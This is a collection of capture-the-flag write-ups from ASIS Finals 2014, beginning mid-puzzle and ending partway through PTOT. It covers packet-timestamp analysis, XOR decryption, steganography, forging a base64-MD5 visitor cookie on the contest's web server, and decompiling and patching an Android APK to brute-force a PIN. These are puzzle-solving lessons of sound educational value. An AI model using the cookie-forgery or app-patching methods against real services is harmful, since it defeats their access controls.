Let’s open this up with Wireshark. This capture file contains a lot of TCP `SYN` packets sent from `192.168.100.5` to `192.168.100.78`. All of these packets are answered with an `ACK/RST` packet, meaning that the port is closed. This looks like a capture from a `SYN` portscan.

Most `SYN`s are denied, except for a few (`tcp.stream eq 2007`). These packets contain extra information, namely the `TSval` and `TSecr` properties.

According to [RFC 1323](http://tools.ietf.org/html/rfc1323), the `TSval` should be “at least approximately proportional to real time”. That means if we can find the scaling value, we can calculate when the `TSval` was `0`. Although `TSval` can be chosen at random at startup, it would make sense that it was set to `0` when the server was started. (How else could we solve this puzzle?)

| ID     | `TSval`      | Time(s)      | Diff(s) Time | Diff (`TSval`) |
|--------|--------------|--------------|--------------|----------------|
| 1      | `2400803286` | `178.174412` | `0`          |  `0`           |
| 2      | `2400803326` | `178.335906` | `0.161494`   |  `40`          |

From this, we can calculate how many `TSval` ticks there are per second. The `TSval` increases with `40` over a time period of `0.167494` seconds, so there is an increase of about `250` ticks per second. (Using the real value creates an error that doesn’t lead to the solution. This is only one sample and a value of `250` ticks per second seems logical.) The `TSval` value for the first packet is `2400803286`. That means that the server started `2400803286 / 250 ~= 9603213.144` seconds ago.

The Epoch time for the first packet is `1412157739.276447000`, so the server should have started at `1402554526.132447`. This corresponds with `Thu, 12 Jun 2014 06:28:46 GMT`. The resulting MD5 hash appears to be incorrect. Since the server is probably located in Iran, we may have to use the Iranian timezone, which is UTC+4.30. The final time is therefore `2014:06:12:10:58`. This gives us `ASIS_{MD5(2014:06:12:10:58)}`, or `ASIS_d6f98bae92a83f10ca6c488c4612e8fc`, which is the solution.

### Alternate solution using brute force

From the [ASIS Quals 2014](https://github.com/ctfs/write-ups/tree/master/asis-ctf-quals-2014#readme) we remembered that checking a flag was done on the client side, in JavaScript. The flag submission page contained a hidden field called `id_check` which was used to check the flag:

```js
if (sha256(sha256(flag)) == id_check) {
  // flag is correct
}
```

A quick look at the flag submission code tells us the same mechanism is used for this CTF. This is interesting, because it gives us the power to brute force flags locally.

The challenge suggests we needed a date in the format `+%Y:%m:%d:%H:%M`. This means we don’t care about seconds, which makes the date rather easy to brute force.

Using Wireshark we found that the first packet in the provided packet capture file had timestamp `1412157562`, so the system must’ve been started some time before that.

We brute forced the flag using the following script:

```python
#!/usr/bin/env python
# coding=utf-8

import datetime
import hashlib

def check_flag(flag):
  hash1 = hashlib.sha256(flag)
  hex1 = hash1.hexdigest()
  hash2 = hashlib.sha256(hex1)
  hex2 = hash2.hexdigest()

  return hex2 == '5ed2645dfc6752f1b105c422d07dcd73807758d259c5783c10bea8b0426b77df'

time = 1412157562
flag_found = False

while not flag_found:
  time -= 60
  time_str = datetime.datetime.fromtimestamp(time).strftime('%Y:%m:%d:%H:%M')
  md5hash = hashlib.md5(time_str)
  md5hex = md5hash.hexdigest()
  flag = 'ASIS_%s' % md5hex
  if check_flag(flag):
    print flag
    flag_found = True
```

After a couple of seconds this printed out the flag: `ASIS_d6f98bae92a83f10ca6c488c4612e8fc`.

## Other write-ups and resources

* <http://beagleharrier.wordpress.com/2014/10/14/asis-ctf-finals-2014important-day-writeup/>
# ASIS Cyber Security Contest Finals 2014: Lion Cub

**Category:** Reverse Engineering
**Points:** 100
**Description:**

> Flag is encrypted using this [program](simple_f0455e55c1d236a28387d04d5a8672ad), can you find it?

## Write-up

Let’s see what [the provided file](simple_f0455e55c1d236a28387d04d5a8672ad) could be:

```bash
$ file simple_f0455e55c1d236a28387d04d5a8672ad
simple_f0455e55c1d236a28387d04d5a8672ad: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < simple_f0455e55c1d236a28387d04d5a8672ad > lion-cub`
* `unxz < simple_f0455e55c1d236a28387d04d5a8672ad > lion-cub`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x simple_f0455e55c1d236a28387d04d5a8672ad
```

Let’s find out what the extracted file is:

```bash
$ file lion-cub
lion-cub: gzip compressed data, from Unix, last modified: Sat Oct 11 11:44:23 2014
```

The ASIS CTF organizers sure like compressing files…

```bash
$ gunzip < lion-cub > lion-cub-unzipped

$ file lion-cub-unzipped
lion-cub-unzipped: POSIX tar archive (GNU)

$ tar xvf lion-cub-unzipped
x simple/
x simple/simple_5c4d29f0e7eeefd7c770a22a93a1daa9
x simple/flag.enc

$ cd simple

$ file simple_5c4d29f0e7eeefd7c770a22a93a1daa9
simple_5c4d29f0e7eeefd7c770a22a93a1daa9: xz compressed data

$ unxz < simple_5c4d29f0e7eeefd7c770a22a93a1daa9 > simple

$ file simple
simple: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, stripped

$ file flag.enc
flag.enc: data
```

Running the `simple` executable results in an error:

```bash
$ ./simple
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc
Aborted
```

Let’s use `ltrace` to see what goes wrong (with the `-C` option to decode/demangle C++ function names):

```bash
$ ltrace -C ./simple
__libc_start_main(0x400bfc, 1, 0x7fff31dab668, 0x400e50, 0x400e40 <unfinished ...>
std::basic_ifstream<char, std::char_traits<char> >::basic_ifstream(char const*, std::_Ios_Openmode)(0x7fff31dab340, 0x400eec, 14, 4, 0x7f4cabb36320) = 0x7f4cac2c1a98
std::basic_ofstream<char, std::char_traits<char> >::basic_ofstream()(0x7fff31dab140, 4, 0x1872000, 134592, 0x7f4cac4e0720) = 0
std::istream::tellg()(0x7fff31dab340, 0x7f4cac09a560, 6, 6, 0x7f4cac2d8030)                      = -1
operator new[](unsigned long)(-1, 4, 0, -1, 0x7f4cac2d8030 <unfinished ...>
__gxx_personality_v0(1, 1, 0x474e5543432b2b00, 0x7f4ca4000910, 0x7fff31daae30)                   = 8
__gxx_personality_v0(1, 1, 0x474e5543432b2b00, 0x7f4ca4000910, 0x7fff31daae30)                   = 8
__gxx_personality_v0(1, 1, 0x474e5543432b2b00, 0x7f4ca4000910, 0x7fff31daae30)                   = 8
terminate called after throwing an instance of 'std::bad_alloc'
__gxx_personality_v0(1, 1, 0x474e5543432b2b00, 0x7f4ca4000910, 0x7fff31daaba0)                   = 6
__gxx_personality_v0(1, 6, 0x474e5543432b2b00, 0x7f4ca4000910, 0x7fff31daaba0)                   = 7
  what():  std::bad_alloc
--- SIGABRT (Aborted) ---
+++ killed by SIGABRT +++
```

It’s trying to open a file. Let’s use `strace` to monitor system calls and see which file that is:

```bash
$ strace ./simple
...
open("flag", O_RDONLY)                  = -1 ENOENT (No such file or directory)
...
```

Aha! So it’s reading the `flag` file and then doing stuff with it. We create a `flag` file ourselves with random content. When now running the file, no error message shows up, and the file `flag.enc` is created. Good. Let’s reverse-engineer how the binary is encrypting the flag. Opening the file in IDA shows that the code is not too complicated. We can spot the encryption algorithm by seeing where it writes to file:

![Reversed encryption algorithm](encryption.png)

So encryption can be summarized as:

```
encrypted[counter] = plaintext[counter] ^ plaintext[counter + 1]
```

This means the last byte will not be encrypted, because otherwise an overflow would occur when accessing the element at `counter +  1`. Hence the last byte in `flag.enc` is not encrypted. With this in mind we can easily reverse decryption:

```
plaintext[counter] = encrypted[counter] ^ plaintext[counter + 1]
```

Eventually we end up with this Python script that decrypts anything encrypted by the `simple` file:

```python
#!/usr/bin/env python
# coding=utf-8
FILE_IN = 'flag.enc'
FILE_OUT = 'flag.dec'

def decrypt():
    data = [ord(c) for c in open(FILE_IN, 'rb').read()]

    # We know data[len(data) - 1] is already plaintext (as it was not encrypted)
    for i in reversed(xrange(len(data) - 1)):
        data[i] = data[i] ^ data[i + 1]

    decrypted = ''.join([chr(b) for b in data])

    f = open(FILE_OUT, 'wb')
    f.write(decrypted)
    f.close()

decrypt()
```

Running the script writes the result to a file named `flag.dec`. Let’s find out what kind of file it is:

```bash
$ file flag.dec
flag.dec: gzip compressed data, was "flag.png", from Unix, last modified: Sat Oct  4 08:26:43 2014
```

Oh no, more compression!

```bash
$ gunzip < flag.dec > flag
gunzip: truncated input

$ file flag
flag: PNG image data, 327 x 327, 1-bit colormap, non-interlaced
```

The `flag` file is a PNG image that displays a QR code, that decodes to the following:

```
1f8b0808928d2f540003666c61672e706e67000192016dfe89504e470d0a
1a0a0000000d494844520000006f0000006f0103000000d80b0c23000000
06504c5445000000ffffffa5d99fdd0000000274524e53ffffc8b5dfc700
0000097048597300000b1200000b1201d2dd7efc0000012449444154388d
d5d431ae84201006e079b1a0d30b90cc35e8b8925e40e5027a253aae41e2
05b0a320ce1bb2bbef651b87668b25167e0501867f007a1bf01d4c004be8
76af0150e449650a71087aa1067afee9762aa36ae2a8746f7523674bbb2f
4de4250c12fd6ff2867cde2968fefe8e7f431e17943af155d81b26d06068
b3dd661a68d005987cfc219997e23b8ab3c24bc9a4808e3acab4da065204
a541e166506402e4592ec71148e499cbe0f914b42a99c91eb59221824591
e4613475b9dd93c804e4087a13472bf3ac05e7781f6b0b0326551be77147
02b35e38540a0064f2481c6fc2d3cbe4c472bc5dd613c9e45e98a10c19cf
576bdc915b9213cbbb524d9c88d73ab667ad44d667e419957b72ffdace79
bc8ccc47fff696eb2ff3734feea7f80bb686232e7a493424000000004945
4e44ae426082fb73fb8e92010000
```

Let’s save that to `decoded.txt`. Then, since the contents are all in hex, maybe this represents a file?

```bash
$ xxd -r -p decoded.txt > decoded.bin

$ file decoded.bin
decoded.bin: gzip compressed data, was "flag.png", from Unix, last modified: Sat Oct  4 08:02:58 2014
```

Here we go again…

```bash
$ gunzip < decoded.bin > decoded

$ file decoded
decoded: PNG image data, 111 x 111, 1-bit colormap, non-interlaced
```

`decoded` is another PNG image that once again displays a QR code. Luckily, this time it decodes to the flag: `ASIS_e87b556efc59f8351aec0858da850906`.

## Other write-ups and resources

* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-lion-club/>
# ASIS Cyber Security Contest Finals 2014: Lottery

**Category:** Web
**Points:** 100
**Description:**

> Go here:
>
> <http://asis-ctf.ir:12437/>

## Write-up

The web site says:

> The 1234567890th visitor, the prize awarded.
> Anyone who has visited our site is the 1234567890th Special prizes are awarded.
> You are the 717 visitor
> Don't hack cookies, we are alive :)

The site sets a cookie named Visitor with the following contents:

```
NzE3Ojc4OGQ5ODY5MDU1MzNhYmEwNTEyNjE0OTdlY2ZmY2Ji
```

This is the base64-encoded version of the string `717:788d986905533aba051261497ecffcbb`, i.e., the visitor count followed by the MD5 hash for that number.

What is the MD5 hash for `1234567890`?

```bash
$ md5 -s '1234567890'
MD5 ("1234567890") = e807f1fcf82d132f9bb018ca6738a19f
```

So, let’s set the cookie value to the base64-encoded version of:

```
1234567890:e807f1fcf82d132f9bb018ca6738a19f
```

…which is:

```bash
$ base64 <<< '1234567890:e807f1fcf82d132f9bb018ca6738a19f'
MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zgo=
```

Refreshing the page now reveals the following message:

> The 1234567890th visitor, the prize awarded.
> Anyone who has visited our site is the 1234567890th Special prizes are awarded.
> the flag is: ASIS_9f1af649f25108144fc38a01f8767c0c

And indeed, `ASIS\_9f1af649f25108144fc38a01f8767c0c` is the flag.

## Other write-ups and resources
* <http://dhanvi1.wordpress.com/2014/10/24/lottery-asis-ctf-2014-web-100-writeup/>
* <http://www.mrt-prodz.com/blog/view/2014/10/asis-ctf-finals-2014---lottery-100pts-writeup>
* <https://hackucf.org/blog/asis-2014-web-100-lottery/>
* <https://beagleharrier.wordpress.com/2014/10/13/asis-ctf-finals-2014lottery-writeup/>
* <http://bruce30262.logdown.com/posts/237386-asis-ctf-finals-2014-how-much-exactly-lottery>
* <http://barrebas.github.io/blog/2014/10/31/asis-ctf-lottery/>
# ASIS Cyber Security Contest Finals 2014: Mask

**Category:** Crypto, Stego
**Points:** 150
**Description:**

> Flag is hidden in [file](mask_e50b38fc9ba38378c444bd93518e886f), find it!
>
> **Hint:** Numerical representation can be useful.

## Write-up

Let’s see what [the provided file](mask_e50b38fc9ba38378c444bd93518e886f) could be:

```bash
$ file mask_e50b38fc9ba38378c444bd93518e886f
mask_e50b38fc9ba38378c444bd93518e886f: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < mask_e50b38fc9ba38378c444bd93518e886f > mask`
* `unxz < mask_e50b38fc9ba38378c444bd93518e886f > mask`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x mask_e50b38fc9ba38378c444bd93518e886f
```

Let’s find out what the extracted file is:

```bash
$ file mask
mask: data
```

Okay, it’s just a bunch of seemingly random, binary data. Let’s use the hint to try to make sense of it, and convert the byte stream into a number. First we use `hexdump` and `xxd` to view the hexadecimal representation of the file, but nothing really stands out. Let’s represent the file as a decimal number. Since the file is quite big, we write a Python script for this:

```py
import binascii
f = open('mask', 'rb')
byte_stream = f.read()
number = int(binascii.hexlify(byte_stream), 16)

with open('big-ass-int.txt', 'w') as number_file:
  number_file.write(str(number))
```

After running this script, `big-ass-int.txt` contains the number, which consists of 674,209 digits:

```bash
$ wc -c big-ass-int.txt
  674209 big-ass-int.txt
```

The number starts with the following digits:

```bash
$ head -c 40 big-ass-int.txt
1415926535890932384626433832095028841971
```

Those look like [the fractional-part digits of `π`](http://www.wolframalpha.com/input/?i=π)! Let’s get the fractional-part digits of `π` and compare them to this number to see if there’s a difference.

[This page](http://www.exploratorium.edu/pi/pi_archive/Pi10-6.html) lists the first million digits of `π`, which is more than enough for our experiment (we only need 674,209 fractional-part digits). After removing the leading `3.` and whitespace we end up with [this file named `pi.txt`](https://gist.githubusercontent.com/anonymous/c2f71add67dd9a7943ad/raw/f1afa4da5012e93921a0c681419427466494a37e/pi-1000000.txt).

Let’s write a Python script `diff.py` to get the digits from the real `π` that are different in the `big-ass-int.txt` file, and format the resulting number in hex.

```python
#!/usr/bin/env python
# coding=utf-8

real_pi = open('pi.txt', 'r').read()
big_ass_int = open('big-ass-int.txt', 'r').read()

result = ''
for i in range(0, len(big_ass_int)):
  if big_ass_int[i] != real_pi[i]:
    result += real_pi[i]

print '%x' % int(result)
```

Let’s treat the hexadecimal output of the script as a byte stream and save the result as a file named `diff.bin`.

```bash
$ python diff.py > diff

$ xxd -r -p diff > diff.bin

$ file diff.bin
diff.bin: xz compressed data
```

Aha, apparently this is another `xz` archive! Let’s extract it using any of the abovementioned techniques:

```bash
$ unxz < diff.bin > extracted

$ file extracted
extracted: PDF document, version 1.5
```

Opening the extracted file in a PDF viewer reveals the flag: `ASIS_d45491d1ad0b63ae05b0f0238d0c48e8`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: Match the pair

**Category:** Web, PPC
**Points:** 200
**Description:**

> Go here:
>
> <http://asis-ctf.ir:12443/>

## Write-up

When we visit the given URL, we find a page where we need to play the game ‘Memory’. It displays images with a circle in them and we need to match the pairs that have the same circle color, like the two examples below.

After beating 40 levels we can find the flag at `http://asis-ctf.ir:12443/flag`.

![](example-1.png)
![](example-2.png)

There are 16 images (so 8 pairs) numbered 0 to 15 which can be found on `http://asis-ctf.ir:12443/pic/<pic number>`.

Checking the page’s JavaScript we find that when a user selects a pair the page sends a `GET` request to `http://asis-ctf.ir:12443/send?first=<pic number1>&second=<pic number2>`.

The server then responds with:

* `OK` if the pair is correct
* `e` if the pair is not correct
* `Done` if all pairs have been found, and you can go to the next level

We then wrote [a script](match-the-pair.py) that downloaded all 16 images and uses [OpenCV](http://opencv.org/) to detect the circle color so we could find the pairs.

Running the script gave us the flag: `ASIS_28ca740e382225131fc0501d38cf5d30`.

## Other write-ups and resources

* <http://blog.squareroots.de/en/2014/10/asis-finals-2014-match-the-pair-webppc-200/>
* <https://github.com/psmitty7373/ctf-writeups/tree/master/ASIS-2014/match_the_pair#readme>
* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-match-the-pairs/>
# ASIS Cyber Security Contest Finals 2014: Natural algorithm

**Category:** Stego, Recon
**Points:** 150
**Description:**

> Find flag in the [image](sunflower_2b870888a7b24ca81ff00529550ecd5f).

## Write-up

Let’s see what [the provided file](sunflower_2b870888a7b24ca81ff00529550ecd5f) could be:

```bash
$ file sunflower_2b870888a7b24ca81ff00529550ecd5f
sunflower_2b870888a7b24ca81ff00529550ecd5f: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < sunflower_2b870888a7b24ca81ff00529550ecd5f > sunflower`
* `unxz < sunflower_2b870888a7b24ca81ff00529550ecd5f > sunflower`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x sunflower_2b870888a7b24ca81ff00529550ecd5f
```

Let’s find out what the extracted file is:

```bash
$ file sunflower
sunflower: TIFF image data, little-endian
```

Renaming the file to `sunflower.tiff` and opening it in an image viewer reveals a picture of a sunflower (who’d have thought?!). [A reverse image search](https://goo.gl/XVhPvX) shows lots of results regarding [Fibonacci numbers](https://en.wikipedia.org/wiki/Fibonacci_number) in nature.

Maybe we should read each byte from the file whose offset corresponds to a Fibonacci number? Let’s see what happens if we do that:

```python
#!/usr/bin/env python
# coding=utf-8
import os

file_path = 'sunflower.tiff'
file_size = os.stat(file_path).st_size
f = open(file_path, 'rb')

current_offset = 1
next_offset = 1
result = ''
while next_offset <= file_size:
  current_offset, next_offset = next_offset, current_offset + next_offset
  f.seek(current_offset)
  result += f.read(1)
print result
```

Running the above Python script prints:

```
I*. ASIS_md5(Fib[10^6])
```

So, we need to figure out what the `10^6`th Fibonacci number is, then calculate its MD5 hash. Luckily, we don’t have to compute this number ourselves — there is [a website dedicated to it](http://www.upl.cs.wisc.edu/~bethenco/fibo/)!

Copying the number from there and removing all line breaks should result in [a very long string](https://gist.githubusercontent.com/anonymous/e787672f2f174db5e9cd/raw/2dca7ad19e560fafb5f5d4f8a1246a983891cf16/fibonacci-1000000.txt) with MD5 hash `e73d27576c4f40d414d9f666c3c79554`.

The flag is `ASIS_e73d27576c4f40d414d9f666c3c79554`.

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest Finals 2014: Numdroid

**Category:** Reverse Engineering, PPC
**Points:** 150
**Description:**

> Download [file](numdriod_b6394a5e1c13c263bf59397968ef0340) and find the flag!

## Write-up

Let’s see what [the provided file](numdriod_b6394a5e1c13c263bf59397968ef0340) could be:

```bash
$ file numdriod_b6394a5e1c13c263bf59397968ef0340
numdriod_b6394a5e1c13c263bf59397968ef0340: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < numdriod_b6394a5e1c13c263bf59397968ef0340 > numdroid`
* `unxz < numdriod_b6394a5e1c13c263bf59397968ef0340 > numdroid`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x numdriod_b6394a5e1c13c263bf59397968ef0340
```

Let’s find out what the extracted file is:

```bash
$ file numdroid
numdroid: Zip archive data, at least v2.0 to extract
```

`numdroid` is actually an Android application package file; feel free to rename it to `numdroid.apk`. `*.apk` files are essentially ZIP files with a different extension. Extracting it reveals (among other things) a `classes.dex` file. `*.dex` files are compiled Android application code files, containing bytecode for the Dalvik Virtual Machine (the workhorse powering the Android system).

Let’s convert the bytecode in the `classes.dex` file back to a `*.jar` file [using `dex2jar`](https://code.google.com/p/dex2jar/):

```bash
$ d2j-dex2jar numdroid.apk
dex2jar numdroid.apk -> numdroid-dex2jar.jar
```

Fun fact: `*.jar` files are essentially zip files too. We can just rename `numdroid-dex2jar.jar` to `numdroid-dex2jar.jar.zip` and unzip it to unpack its contents. Alternatively, this command has the same result:

```bash
$ jar xf numdroid-dex2jar.jar
```

In this case, the resulting source files aren’t easily readable, so let’s use a decompiler. Open `numdroid-dex2jar.jar` in [JD-GUI](http://jd.benow.ca/). Now we can view all the source code, or go to _File_ → _Save All Sources_ to save the sources so we can view them in our preferred text editor.

The source code of the `classes-dex2jar.src/io/asis/ctf2014/numdriod/MainActivity.java` class reveals that the app displays the flag once the correct password is entered:

```java
protected void ok_clicked()
{
  DebugTools.log("clicked password: " + this.mScreen.getText());
  boolean bool = Verify.isOk(this, this.mScreen.getText().toString());
  DebugTools.log("password is Ok? : " + bool);
  if (bool)
  {
    Intent localIntent = new Intent(this, LipSum.class);
    Bundle localBundle = new Bundle();
    localBundle.putString("flag", this.mScreen.getText().toString().substring(0, 7));
    localIntent.putExtras(localBundle);
    startActivity(localIntent);
    return;
  }
  Toast.makeText(this, 2131034114, 1).show();
  this.mScreen.setText("");
}
```

The `Verify.isOk` function is defined in `classes-dex2jar.src/io/asis/ctf2014/numdriod/Verify.java`, and looks like this:

```java
public static boolean isOk(Context paramContext, String paramString)
{
  String str1 = paramString;
  if (paramString.length() > 7)
    str1 = paramString.substring(0, 7);
  String str2 = OneWayFunction(str1);
  DebugTools.log("digest: " + str1 + " => " + str2);
  boolean bool1 = str2.equals("be790d865f2cea9645b3f79c0342df7e");
  boolean bool2 = false;
  if (bool1)
    bool2 = true;
  return bool2;
}
```

So, our input is hashed according to `OneWayFunction`, and if the hashed result equals `be790d865f2cea9645b3f79c0342df7e`, we get the flag. Let’s take a look at `OneWayFunction`:

```java
private static String OneWayFunction(String paramString)
{
  List localList = ArrayTools.map(ArrayTools.select(ArrayTools.map(new String[] { "MD2", "MD5", "SHA-1", "SHA-256", "SHA-384", "SHA-512" }, new MapAction()
  {
    public byte[] action(String paramAnonymousString)
    {
      try
      {
        MessageDigest localMessageDigest = MessageDigest.getInstance(paramAnonymousString);
        localMessageDigest.update(Verify.this.getBytes());
        byte[] arrayOfByte = localMessageDigest.digest();
        return arrayOfByte;
      }
      catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
      {
      }
      return null;
    }
  }), new SelectAction()
  {
    public boolean action(byte[] paramAnonymousArrayOfByte)
    {
      return paramAnonymousArrayOfByte != null;
    }
  }), new MapAction()
  {
    public byte[] action(byte[] paramAnonymousArrayOfByte)
    {
      byte[] arrayOfByte = new byte[8];
      int i = 0;
      if (i >= arrayOfByte.length / 2);
      for (int j = 0; ; j++)
      {
        if (j >= arrayOfByte.length / 2)
        {
          return arrayOfByte;
          arrayOfByte[i] = paramAnonymousArrayOfByte[i];
          i++;
          break;
        }
        arrayOfByte[(j + arrayOfByte.length / 2)] = paramAnonymousArrayOfByte[(-2 + (paramAnonymousArrayOfByte.length - j))];
      }
    }
  });
  byte[] arrayOfByte1 = new byte[8 * localList.size()];
  int i = 0;
  while (true)
  {
    if (i >= arrayOfByte1.length);
    try
    {
      MessageDigest localMessageDigest = MessageDigest.getInstance("MD5");
      localMessageDigest.update(arrayOfByte1);
      byte[] arrayOfByte2 = localMessageDigest.digest();
      StringBuilder localStringBuilder = new StringBuilder();
      int j = arrayOfByte2.length;
      int k = 0;
      if (k >= j)
      {
        String str1 = localStringBuilder.toString();
        return str1;
        arrayOfByte1[i] = ((byte[])localList.get(i % localList.size()))[(i / localList.size())];
        i++;
      }
      else
      {
        String str2;
        for (Object localObject = Integer.toHexString(0xFF & arrayOfByte2[k]); ; localObject = str2)
        {
          if (((String)localObject).length() >= 2)
          {
            localStringBuilder.append((String)localObject);
            k++;
            break;
          }
          str2 = "0" + (String)localObject;
        }
      }
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
    {
    }
  }
  return "";
}
```

Let’s install `numdroid.apk` onto an Android device (or emulator):

```bash
$ adb install numdroid.apk
```

The app seems to be looking for a password consisting of up to 7 numerical digits. This can be solved using brute force directly on a fairly recent smartphone. In order to do so, the APK has to be modified to test every combination, instead of only the one entered in the text field.

The easiest way to modify an APK is with [APK studio](http://forum.xda-developers.com/showthread.php?t=2493107). A quick scan through the files reveals calls to the `DebugTools.log()` method. However, `logcat` does not display any logs from the `apk`. A quick look at the `DebugTools` class reveals the following:

```
# direct methods
.method static constructor <clinit>()V
  .locals 1

  .prologue
  .line 6
  const-string v0, "Numdroid"

  sput-object v0, Lio/asis/ctf2014/numdriod/tools/DebugTools;->DBG_TAG:Ljava/lang/String;

  .line 7
  const/4 v0, 0x0

  sput-boolean v0, Lio/asis/ctf2014/numdriod/tools/DebugTools;->DBG:Z

  return-void
```

By changing the `DBG` flag to `0x1` in the constructor (line 23 in `DebugTools.smali`), all debug calls are forwarded to `logcat`.

The code that is executed when the ‘go’ button is pressed can be found in `MainActivity.smali` (line 339).

```
  .line 77
  iget-object v3, p0, Lio/asis/ctf2014/numdriod/MainActivity;->mScreen:Landroid/widget/EditText;

  invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

  move-result-object v3

  invoke-interface {v3}, Landroid/text/Editable;->toString()Ljava/lang/String;

  move-result-object v3

  invoke-static {p0, v3}, Lio/asis/ctf2014/numdriod/Verify;->isOk(Landroid/content/Context;Ljava/lang/String;)Z

  move-result v2
```

A single string is sent to the `Verify.isOk` method. The easiest (laziest?) way to modify this to a bruteforce is coding a bruteforce in Java, then copying over the resulting Dalvik codes. I made the Java code similar to the Numdroid code to minimize the required modifications:

```java
@Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    if (savedInstanceState == null) {
      getSupportFragmentManager().beginTransaction()
          .add(R.id.container, new PlaceholderFragment()).commit();
    }

    for(int i = 0; i< 9999999; i++)
    {
      boolean ok = MainActivity.isOk(Integer.toString(i));
      if(i % 100000 == 0)
      {
        log(Integer.toString(i));
      }
      if(ok)
      {
        log(Integer.toString(i));
      }
    }
  }

  public void log(String str)
  {
    //do something
  }

  public static boolean isOk(String str)
  {
    return true;
  }
```

Which translates to…

```
.line 26
  :cond_0
  const/4 v0, 0x0

  .local v0, "i":I
  :goto_0
  const v2, 0x98967f

  if-lt v0, v2, :cond_1

  .line 38
  return-void

  .line 28
  :cond_1
  invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

  move-result-object v2

  invoke-static {v2}, Lcom/example/forloop/MainActivity;->isOk(Ljava/lang/String;)Z

  move-result v1

  .line 29
  .local v1, "ok":Z
  const v2, 0x186a0

  rem-int v2, v0, v2

  if-nez v2, :cond_2

  .line 31
  invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

  move-result-object v2

  invoke-virtual {p0, v2}, Lcom/example/forloop/MainActivity;->log(Ljava/lang/String;)V

  .line 33
  :cond_2
  if-eqz v1, :cond_3

  .line 35
  invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

  move-result-object v2

  invoke-virtual {p0, v2}, Lcom/example/forloop/MainActivity;->log(Ljava/lang/String;)V

  .line 26
  :cond_3
  add-int/lit8 v0, v0, 0x1

  goto :goto_0
```

In order to paste this into the `Numdroid.apk`, some changes have to be made. The Numdroid code already contains a `cond_0` and a `goto_0` so our code has to be changed to use `:goto_1` and `:cond_4`. Lastly, the method names have to be changed, resulting in the following:

```
  const/4 v0, 0x0

  .local v0, "i":I
  :goto_3
  const v2, 0x98967f

  if-lt v0, v2, :cond_3
  return-void

  .line 28
  :cond_3
  invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

  move-result-object v2

  invoke-static {p0, v2}, Lio/asis/ctf2014/numdriod/Verify;->isOk(Landroid/content/Context;Ljava/lang/String;)Z

  move-result v1

  .line 29
  .local v1, "ok":Z

   const v4, 0x186a0

  rem-int v4, v0, v4

  if-nez v4, :cond_6

  .line 31
  invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

  move-result-object v2
  invoke-static {v2}, Lio/asis/ctf2014/numdriod/tools/DebugTools;->log(Ljava/lang/String;)V

  :cond_6

  if-eqz v1, :cond_2

  goto :goto_4
  .line 31
  invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

  move-result-object v2

  invoke-static {v2}, Lio/asis/ctf2014/numdriod/tools/DebugTools;->log(Ljava/lang/String;)V

  .line 26
  :cond_2
  add-int/lit8 v0, v0, 0x1

  goto :goto_3
```

APK Studio can then recompile the `apk` and you can install it using `adb install numdroid.apk`. Be aware that the certificate used to sign the modified `apk` is different from the original one, so you have to uninstall the original application first.

My Galaxy S4 smartphone tries about 100,000 combinations per minute, so it could take 1.5 hours to try all the combinations. That’s a lot slower than my computer would do it, but it’s still fast enough.

After some time, the correct code is found (`3130110`) and the following message is shown:

> The Flag is: `ASIS_{MD5(3130110)}`

`md5(3130110)` is `3c56e1ed0597056fef0006c6d1c52463`, so the flag is `ASIS_3c56e1ed0597056fef0006c6d1c52463`.

That was a lot more fun than just running the Java code on my computer ;).

## Other write-ups and resources

* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-numdroid/>
# ASIS Cyber Security Contest Finals 2014: PTOT

**Category:** Stego, Crypto
**Points:** 150
**Description:**

> Find flag in the [image](PTOT_1d23c8694e5cf6727b9ed21285a0d61f)!
>
> **Hint:** You can see that:
>
> `1 --> 3`
>
> and so on…

## Write-up

Let’s see what [the provided file](PTOT_1d23c8694e5cf6727b9ed21285a0d61f) could be:

```bash
$ file PTOT_1d23c8694e5cf6727b9ed21285a0d61f
PTOT_1d23c8694e5cf6727b9ed21285a0d61f: xz compressed data
```

So, we extract the file using the built-in `xz` or `unxz` commands:

* `xz -dc < PTOT_1d23c8694e5cf6727b9ed21285a0d61f > ptot`
* `unxz < PTOT_1d23c8694e5cf6727b9ed21285a0d61f > ptot`

Alternatively, extract the provided file using [p7zip](http://p7zip.sourceforge.net/):

```bash
7z x PTOT_1d23c8694e5cf6727b9ed21285a0d61f
```

Let’s find out what the extracted file is:

```bash
$ file ptot
ptot: JPEG image data, JFIF standard 1.01
```

The image contains the ‘Periodic Table of Typefaces’ of which you can find [a PDF version online](http://www.voiceonapage.com/ProjectsTypography/Typeface%20Poster/PTOT.pdf).

If we compare the original image with the image of the challenge we can see many differences. The differences are highlighted in the following [self-made image](PTOT_diff.jpg):

![](ptot-diff.jpg)

